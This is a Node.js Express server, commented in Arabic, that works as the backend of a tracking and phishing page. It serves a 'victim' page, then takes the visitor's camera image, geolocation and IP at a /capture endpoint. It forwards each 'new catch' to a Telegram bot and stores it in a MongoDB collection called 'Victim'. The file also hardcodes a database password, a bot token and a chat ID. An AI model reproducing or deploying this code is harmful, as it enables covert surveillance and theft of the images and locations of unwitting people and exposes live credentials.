const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express(); // هنا تم تعريف "app" لحل المشكلة

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// إعدادات البوت والقاعدة الخاصة بك
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/myDatabase?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

mongoose.connect(MONGO_URI).then(() => console.log("✅ Database Ready")).catch(err => console.log(err));

const Victim = mongoose.model('Victim', new mongoose.Schema({
    ip: String, image: String, location: Object, date: { type: Date, default: Date.now }
}));

// تقديم صفحة الضحية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال الصيد وإرساله للتيليجرام
app.post('/capture', async (req, res) => {
    try {
        const { image, location } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // إرسال البيانات للبوت فوراً
        const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "غير متوفر";
        const message = `🎯 صيد جديد!\n🌐 IP: ${ip}\n📍 الموقع: ${mapUrl}`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });

        // حفظ في القاعدة
        const newData = new Victim({ ip, image, location });
        await newData.save();
        
        res.status(200).send("Done");
    } catch (error) {
        console.error(error);
        res.status(500).send("Error");
    }
});

app.listen(process.env.PORT || 3000, () => {
    console.log("🚀 Server is running...");
});
